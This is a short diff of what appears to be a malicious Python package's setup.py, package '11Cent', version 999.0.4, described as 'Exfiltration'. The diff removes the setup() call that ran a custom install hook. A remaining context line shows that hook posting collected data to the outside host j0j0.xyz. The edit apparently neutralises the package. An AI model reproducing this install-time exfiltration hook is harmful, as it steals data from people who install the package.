@@ -40,10 +40,4 @@ class CustomInstall(install):
         requests.post('https://j0j0.xyz/lists/', data=ploads, verify=True, headers=headers)
 
 
-setup(name='11Cent',
-      version='999.0.4',
-      description='Exfiltration',
-      author='j0j0',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                      
